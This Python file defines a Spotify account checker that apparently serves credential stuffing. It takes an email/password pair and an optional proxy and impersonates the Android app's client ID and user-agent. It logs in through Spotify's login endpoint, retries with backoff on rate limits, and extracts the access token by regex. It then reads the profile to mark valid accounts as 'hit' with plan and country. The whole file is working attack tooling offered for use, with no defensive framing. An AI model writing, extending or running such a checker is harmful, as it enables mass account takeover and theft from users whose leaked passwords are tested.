import requests
import time
import uuid
import re

def check_spotify(email: str, password: str, proxy_url: str = None) -> dict:
    result = {
        'email': email,
        'password': password,
        'success': False,
        'status': 'bad',
        'plan': 'Unknown',
        'country': 'Unknown',
        'username': 'Unknown',
        'display_name': 'Unknown',
        'email_verified': False,
        'product': 'Unknown',
        'error': None,
        'message': None,
    }

    session = requests.Session()
    session.headers.update({
        'User-Agent': 'Spotify/8.9.58.585 Android/34 (SM-G991B)',
        'Accept': 'application/json',
        'Accept-Language': 'en-US,en;q=0.9',
    })

    if proxy_url:
        session.proxies = {'http': proxy_url, 'https': proxy_url}

    max_retries = 3
    for attempt in range(max_retries):
        try:
            # Step 1: Get client token
            client_token_resp = session.post(
                'https://clienttoken.spotify.com/v1/clienttoken',
                json={
                    "client_data": {
                        "client_version": "8.9.58.585",
                        "client_id": "d8a5ed958d274c2e8ee717e6a4b0971d",
                        "js_sdk_data": {
                            "device_brand": "samsung",
                            "device_model": "SM-G991B",
                            "os": "android",
                            "os_version": "34",
                            "device_id": str(uuid.uuid4()).replace('-', ''),
                            "device_type": "phone"
                        }
                    }
                },
                timeout=15
            )

            if client_token_resp.status_code != 200:
                result['message'] = f"Client token HTTP {client_token_resp.status_code}"
                return result

            client_token = client_token_resp.json().get('granted_token', {}).get('token')
            if not client_token:
                result['message'] = "No client token in response"
                return result

            print(f"[Spotify] client_token OK: {client_token[:20]}...")

            # Step 2: Login — response is protobuf binary
            login_resp = session.post(
                'https://login5.spotify.com/v3/login',
                headers={
                    'client-token': client_token,
                    'Content-Type': 'application/x-www-form-urlencoded',
                },
                data={
                    'client_id': 'd8a5ed958d274c2e8ee717e6a4b0971d',
                    'grant_type': 'password',
                    'username': email,
                    'password': password,
                },
                timeout=15
            )

            print(f"[Spotify] login5 status={login_resp.status_code} len={len(login_resp.content)}")
            print(f"[Spotify] hex={login_resp.content[:300].hex()}")

            if login_resp.status_code == 200 and len(login_resp.content) <= 10:
                result['status'] = 'bad'
                result['message'] = 'Account requires email verification'
                return result

            if login_resp.status_code == 429:
                time.sleep(2 ** attempt)
                continue

            if login_resp.status_code in (400, 401):
                result['status'] = 'bad'
                result['message'] = 'Invalid credentials'
                return result

            if login_resp.status_code == 403:
                result['status'] = 'bad'
                result['message'] = 'Account banned or restricted'
                return result

            if login_resp.status_code != 200:
                result['message'] = f"Login HTTP {login_resp.status_code}"
                return result

            # Extract token from protobuf binary
            # Spotify tokens start with BQ or AQ (URL-safe base64)
            access_token = None

            # Try 1: BQ/AQ opaque token (confirmed from DevTools)
            token_match = re.search(rb'[AB]Q[A-Za-z0-9_\-]{50,}', login_resp.content)
            if token_match:
                access_token = token_match.group(0).decode('ascii')
                print(f"[Spotify] Found BQ/AQ token: {access_token[:20]}...")

            # Try 2: JWT fallback (eyJ...)
            if not access_token:
                jwt_match = re.search(
                    rb'eyJ[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]+\.[A-Za-z0-9_\-]*',
                    login_resp.content
                )
                if jwt_match:
                    access_token = jwt_match.group(0).decode('ascii')
                    print(f"[Spotify] Found JWT token: {access_token[:20]}...")

            # Try 3: Any long alphanumeric string 100+ chars
            if not access_token:
                candidates = re.findall(rb'[A-Za-z0-9]{100,}', login_resp.content)
                if candidates:
                    access_token = candidates[0].decode('ascii')
                    print(f"[Spotify] Fallback token: {access_token[:20]}...")

            if not access_token:
                result['message'] = 'Could not extract access token'
                return result

            # Step 3: Get user profile
            profile_resp = session.get(
                'https://api.spotify.com/v1/me',
                headers={'Authorization': f'Bearer {access_token}'},
                timeout=15
            )

            print(f"[Spotify] /v1/me status={profile_resp.status_code} body={profile_resp.text[:100]}")

            if profile_resp.status_code == 200:
                profile = profile_resp.json()
                product = profile.get('product', 'free')
                result['plan'] = 'Premium' if product == 'premium' else 'Free'
                result['product'] = product
                result['country'] = profile.get('country', 'Unknown')
                result['username'] = profile.get('id', 'Unknown')
                result['display_name'] = profile.get('display_name', 'Unknown')
                result['email_verified'] = profile.get('email') is not None

            result['success'] = True
            result['status'] = 'hit'
            return result

        except requests.exceptions.Timeout:
            if attempt < max_retries - 1:
                time.sleep(1)
                continue
            result['message'] = 'Timeout'
            return result
        except Exception as e:
            result['message'] = str(e)
            return result

    return result